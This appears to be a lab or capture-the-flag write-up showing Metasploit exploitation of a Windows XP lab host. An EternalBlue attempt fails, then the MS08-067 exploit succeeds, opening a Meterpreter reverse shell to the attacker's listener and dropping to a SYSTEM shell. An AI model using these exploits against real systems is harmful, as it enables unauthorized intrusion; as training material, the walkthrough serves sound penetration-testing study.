Based on the nmap results, there are vulnerabilities to choose from.
## eternalblue
```
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.4:445 - The target is vulnerable.
[-] 10.10.10.4:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
[*] Exploit completed, but no session was created.
```
No luck

## ms08-067
```
msf exploit(windows/smb/ms17_010_eternalblue) > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > info 0

       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
     Module: exploit/windows/smb/ms08_067_netapi
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2008-10-28

<SNIP>

Description:
  This module exploits a parsing flaw in the path canonicalization code of
  NetAPI32.dll through the Server Service. This module is capable of bypassing
  NX on some operating systems and service packs. The correct target must be
  used to prevent the Server Service (along with a dozen others in the same
  process) from crashing. Windows XP targets seem to handle multiple successful
  exploitation events, but 2003 targets will often crash or hang on subsequent
  attempts. This is just the first version of this module, full support for
  NX bypass on 2003, along with other platforms, is still in development.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2008-4250
  OSVDB (49243)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/MS08-067
  https://www.rapid7.com/db/vulnerabilities/dcerpc-ms-netapi-netpathcanonicalize-dos/

Also known as:
  ECLIPSEDWING


View the full module info with the info -d command.

```

## exploitation
```
msf exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.4:1032) at 2025-09-13 09:43:44 -0600                                                        
                                                                             
meterpreter > shell                                                          
Process 1760 created.                                                        
Channel 1 created.                                                           
Microsoft Windows XP [Version 5.1.2600]                                      
(C) Copyright 1985-2001 Microsoft Corp.                                      
                                                                             
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>echo %username%
echo %username%
LEGACY$

```